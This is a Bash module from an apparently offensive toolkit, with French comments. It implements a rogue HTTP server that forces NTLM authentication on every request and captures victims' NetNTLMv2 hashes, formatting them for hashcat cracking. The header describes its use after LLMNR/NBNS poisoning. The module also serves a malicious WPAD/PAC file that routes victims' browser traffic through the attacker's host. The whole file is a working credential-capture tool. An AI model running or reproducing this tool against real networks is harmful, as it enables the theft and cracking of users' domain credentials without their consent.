#!/usr/bin/env bash
#
# lib/server/http/ntlm.sh - Serveur HTTP minimal capture NTLM
#
# Repond en 401 WWW-Authenticate: NTLM, echange les 3 messages NTLM
# (Negotiate / Challenge / Authenticate) et capture le NetNTLMv2.
#
# Scenarios :
#   - Redirect LLMNR/NBNS -> victime tape une URL -> capture HTTP NTLM
#   - WPAD/proxy auth forcee
#
# API publique :
#   http::server::start    <bind_ip> [port] [challenge_hex] [callback_cmd]
#   http::server::stop
#   http::server::build_challenge      <var_out> <challenge_hex>
#   http::server::capture_negotiate    <b64_type1> <var_dict_out>
#   http::server::capture_authenticate <b64_type3> <var_dict_out>
#   http::server::format_hashcat_ntlmv2 <dict_name> <challenge_hex>
#
# Dependances : core/endian, core/log, core/hex, encoding/base64,
#               encoding/utf16, protocol/ntlm/flags,
#               protocol/ntlm/challenge, protocol/ntlm/authenticate
#
# ─────────────────────────────────────────────────────────────────────────────

[[ -n "${_BK_SERVER_HTTP_NTLM:-}" ]] && return 0
readonly _BK_SERVER_HTTP_NTLM=1

bk::import core/endian
bk::import core/log
bk::import core/hex
bk::import encoding/base64
bk::import encoding/utf16
bk::import protocol/ntlm/flags
bk::import protocol/ntlm/challenge
bk::import protocol/ntlm/authenticate

# ── Constantes ────────────────────────────────────────────────────────────────

readonly HTTP_SRV_DEFAULT_PORT=80
readonly HTTP_SRV_DEFAULT_CHALLENGE="1122334455667788"

# ── Etat serveur ─────────────────────────────────────────────────────────────

_HTTP_SRV_PID=""
_HTTP_SRV_HANDLER=""
_HTTP_SRV_CAPTURE_LOG=""

# ── API publique ─────────────────────────────────────────────────────────────

# http::server::build_challenge <var_out> <challenge_hex>
#
# Construit le Type 2 NTLM encode en base64, pret pour WWW-Authenticate: NTLM.
# Pas de SPNEGO : HTTP NTLM transporte le message brut en base64.
http::server::build_challenge() {
    local -n _hbc_out="$1"
    local challenge="${2^^}"

    local ntlm_chall
    ntlm::challenge::build ntlm_chall "${challenge}" \
        "WORKGROUP" "WORKGROUP" "SERVER" \
        "workgroup.local" "server.workgroup.local"

    base64::encode_hex "${ntlm_chall}" _hbc_out
}

# http::server::capture_negotiate <b64_type1> <var_dict_out>
#
# Decode et parse un NTLM Negotiate (Type 1) depuis Authorization: NTLM.
# Remplit : flags
http::server::capture_negotiate() {
    local b64="$1"
    local -n _hcn_dict="$2"

    local hex
    base64::decode "${b64}" hex

    # Verifier signature NTLMSSP
    [[ "${hex:0:16}" == "4E544C4D53535000" ]] || return 1
    local -i msgtype; endian::read_le32 "${hex}" 8 msgtype
    (( msgtype == 1 )) || return 1

    hex::slice "${hex}" 12 4 _hcn_dict[flags]
}

# http::server::capture_authenticate <b64_type3> <var_dict_out>
#
# Decode et parse un NTLM Authenticate (Type 3) depuis Authorization: NTLM.
# Remplit : username, domain, workstation, nt_proof, nt_blob, nt_response, lm_response
http::server::capture_authenticate() {
    local b64="$1"
    local -n _hca_dict="$2"

    local hex
    base64::decode "${b64}" hex

    local -A _auth
    ntlm::authenticate::parse "${hex}" _auth || return 1

    local user domain workstation
    utf16::decode_le "${_auth[username]}"    user
    utf16::decode_le "${_auth[domain]}"      domain
    utf16::decode_le "${_auth[workstation]}" workstation

    _hca_dict[username]="${user}"
    _hca_dict[domain]="${domain}"
    _hca_dict[workstation]="${workstation}"
    _hca_dict[nt_proof]="${_auth[nt_proof]}"
    _hca_dict[nt_blob]="${_auth[nt_blob]}"
    _hca_dict[nt_response]="${_auth[nt_response]}"
    _hca_dict[lm_response]="${_auth[lm_response]}"
}

# http::server::format_hashcat_ntlmv2 <dict_name> <challenge_hex>
#
# Formate en NetNTLMv2 hashcat mode 5600 :
#   username::domain:challenge:nt_proof:blob
http::server::format_hashcat_ntlmv2() {
    local -n _hfh_dict="$1"
    local challenge="${2^^}"

    printf '%s::%s:%s:%s:%s\n' \
        "${_hfh_dict[username]}" \
        "${_hfh_dict[domain]}" \
        "${challenge}" \
        "${_hfh_dict[nt_proof]}" \
        "${_hfh_dict[nt_blob]}"
}

# ── Serveur socat ─────────────────────────────────────────────────────────────

# http::server::start <bind_ip> [port] [challenge_hex] [callback_cmd]
#
# Lance un listener HTTP capture NTLM via socat.
# Repond en 401 NTLM sur toute requete, optionnellement sert un WPAD
# si la requete concerne /wpad.dat ou /proxy.pac.
http::server::start() {
    local bind_ip="$1"
    local -i port="${2:-${HTTP_SRV_DEFAULT_PORT}}"
    local challenge="${3:-${HTTP_SRV_DEFAULT_CHALLENGE}}"
    local callback_cmd="${4:-}"

    challenge="${challenge^^}"

    if ! command -v socat &>/dev/null; then
        log::error "http::server : socat introuvable"
        return 1
    fi

    local bk_root
    bk_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"

    local capture_log
    capture_log="$(mktemp /tmp/http_capture_XXXXXX.log)"
    _HTTP_SRV_CAPTURE_LOG="${capture_log}"

    local handler
    handler="$(mktemp /tmp/http_handler_XXXXXX.sh)"
    _HTTP_SRV_HANDLER="${handler}"

    cat > "${handler}" <<HEADER
#!/usr/bin/env bash
set -uo pipefail
_bk_root="${bk_root}"
_challenge="${challenge}"
_capture_log="${capture_log}"
_callback_cmd="${callback_cmd}"
_bind_ip="${bind_ip}"
_port="${port}"
HEADER

    cat >> "${handler}" << 'BODY'

source "${_bk_root}/bashket.sh"
bk::import core/endian
bk::import core/hex
bk::import encoding/base64
bk::import encoding/utf16
bk::import protocol/ntlm/flags
bk::import protocol/ntlm/challenge
bk::import protocol/ntlm/authenticate
bk::import server/http/ntlm

# Lire les headers HTTP d'une requete depuis stdin.
# Variables de sortie globales : _method _path _auth_token _content_length
_read_http_request() {
    _method="" _path="" _auth_token="" _content_length=0
    local line
    while IFS= read -r -t 30 line; do
        line="${line%$'\r'}"
        [[ -z "${line}" ]] && return 0
        if [[ "${line}" =~ ^([A-Z]+)\ (/[^ ]*)\ HTTP ]]; then
            _method="${BASH_REMATCH[1]}"
            _path="${BASH_REMATCH[2]}"
        elif [[ "${line}" =~ ^[Aa]uthorization:[[:space:]]+(NTLM|Negotiate)[[:space:]]+([a-zA-Z0-9+/=]+) ]]; then
            _auth_token="${BASH_REMATCH[2]}"
        elif [[ "${line}" =~ ^[Cc]ontent-[Ll]ength:[[:space:]]*([0-9]+) ]]; then
            _content_length="${BASH_REMATCH[1]}"
        fi
    done
    return 1  # read timeout ou EOF
}

# Drainer le body si Content-Length > 0
_drain_body() {
    (( _content_length > 0 )) && dd bs=1 count="${_content_length}" >/dev/null 2>&1
    _content_length=0
}

# Reponse HTTP 401 sans token (premiere demande d'auth)
_send_401_bare() {
    printf 'HTTP/1.1 401 Unauthorized\r\n'
    printf 'WWW-Authenticate: NTLM\r\n'
    printf 'Content-Length: 0\r\n'
    printf 'Connection: keep-alive\r\n'
    printf '\r\n'
}

# Reponse HTTP 401 avec challenge Type 2 en base64
_send_401_challenge() {
    local b64="$1"
    printf 'HTTP/1.1 401 Unauthorized\r\n'
    printf 'WWW-Authenticate: NTLM %s\r\n' "${b64}"
    printf 'Content-Length: 0\r\n'
    printf 'Connection: keep-alive\r\n'
    printf '\r\n'
}

# Reponse 401 finale (apres capture)
_send_401_final() {
    printf 'HTTP/1.1 401 Unauthorized\r\n'
    printf 'Content-Length: 0\r\n'
    printf 'Connection: close\r\n'
    printf '\r\n'
}

# Reponse WPAD / PAC
_send_wpad() {
    local pac="function FindProxyForURL(url,host){return \"PROXY ${_bind_ip}:${_port}\";}"
    local -i pac_len=${#pac}
    printf 'HTTP/1.1 200 OK\r\n'
    printf 'Content-Type: application/x-ns-proxy-autoconfig\r\n'
    printf 'Content-Length: %d\r\n' "${pac_len}"
    printf 'Connection: close\r\n'
    printf '\r\n'
    printf '%s' "${pac}"
}

# -- Etape 1 : premiere requete (pas encore d'auth) ----------------------------

_read_http_request || exit 0

# Servir WPAD si demande
if [[ "${_path}" == "/wpad.dat" || "${_path}" == "/proxy.pac" ]]; then
    _send_wpad
    exit 0
fi

_drain_body
_send_401_bare

# -- Etape 2 : deuxieme requete avec Authorization: NTLM <Type1> ---------------

_read_http_request || exit 0
_drain_body

[[ -n "${_auth_token}" ]] || { _send_401_final; exit 0; }

# Construire le challenge Type 2
declare _b64_challenge
http::server::build_challenge _b64_challenge "${_challenge}"
_send_401_challenge "${_b64_challenge}"

# -- Etape 3 : troisieme requete avec Authorization: NTLM <Type3> --------------

_read_http_request || exit 0
_drain_body

[[ -n "${_auth_token}" ]] || { _send_401_final; exit 0; }

declare -A _auth_dict
if http::server::capture_authenticate "${_auth_token}" _auth_dict; then
    declare _hash
    _hash=$(http::server::format_hashcat_ntlmv2 _auth_dict "${_challenge}")

    printf '%s\n' "${_hash}" >> "${_capture_log}"

    printf '[+] %s\\%s depuis %s\n' \
        "${_auth_dict[domain]}" \
        "${_auth_dict[username]}" \
        "${SOCAT_PEERADDR:-?}" >&2
    printf '    %s\n' "${_hash}" >&2

    if [[ -n "${_callback_cmd}" ]]; then
        ${_callback_cmd} \
            "${_auth_dict[username]}" \
            "${_auth_dict[domain]}" \
            "${_hash}" \
            "${SOCAT_PEERADDR:-}" &>/dev/null &
    fi
fi

_send_401_final
exit 0
BODY

    chmod +x "${handler}"

    socat "TCP4-LISTEN:${port},bind=${bind_ip},reuseaddr,fork" \
        "EXEC:bash ${handler}" >/dev/null 2>&1 &
    local -i pid=$!
    _HTTP_SRV_PID="${pid}"

    sleep 0.3
    if ! kill -0 "${pid}" 2>/dev/null; then
        wait "${pid}" 2>/dev/null || true
        rm -f "${handler}" "${capture_log}"
        _HTTP_SRV_PID="" ; _HTTP_SRV_HANDLER="" ; _HTTP_SRV_CAPTURE_LOG=""
        log::error "http::server : echec demarrage (port ${port} accessible ?)"
        return 1
    fi

    log::info "http::server : listener demarre ${bind_ip}:${port} challenge=${challenge} (pid=${pid})"
    log::info "http::server : captures -> ${capture_log}"
}

# http::server::stop
http::server::stop() {
    [[ -z "${_HTTP_SRV_PID:-}" ]] && return 0
    kill "${_HTTP_SRV_PID}" 2>/dev/null || true
    wait "${_HTTP_SRV_PID}" 2>/dev/null || true
    log::debug "http::server : arrete (pid=${_HTTP_SRV_PID})"
    [[ -n "${_HTTP_SRV_HANDLER:-}"     ]] && rm -f "${_HTTP_SRV_HANDLER}"
    _HTTP_SRV_PID="" ; _HTTP_SRV_HANDLER="" ; _HTTP_SRV_CAPTURE_LOG=""
}
